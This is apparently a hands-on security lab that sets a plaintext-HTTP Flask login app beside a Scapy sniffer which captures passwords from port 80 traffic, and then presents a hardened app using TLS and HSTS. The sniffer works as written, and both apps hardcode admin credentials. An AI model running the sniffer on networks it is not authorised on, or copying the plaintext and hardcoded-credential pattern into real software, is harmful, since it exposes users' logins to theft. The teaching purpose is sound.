# 06 - Hands-on Lab

## Vulnerable vs Secure Implementation

### Vulnerable Plaintext HTTP App (Python Flask)
```python
# vulnerable_app.py
from flask import Flask, request

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    # Transmitted in plaintext!
    if username == "admin" and password == "secret123":
        return "Logged In!"
    return "Failed"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

### Scapy Sniffer Script (Attacker)
```python
# sniffer.py
from scapy.all import *

def process_packet(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors='ignore')
        if "password=" in payload:
            print(f"[!] Captured Credentials: {payload}")

print("Sniffing for HTTP passwords...")
sniff(filter="tcp port 80", prn=process_packet, store=0)
```

### Secure Hardened App (TLS 1.3 & HSTS)
To fix this, we enforce TLS and HSTS.
```python
# secure_app.py
from flask import Flask, request, Response

app = Flask(__name__)

@app.after_request
def apply_hsts(response):
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    if username == "admin" and password == "secret123":
        return "Logged In (Securely)!"
    return "Failed"

if __name__ == '__main__':
    # Require SSL Context
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
```
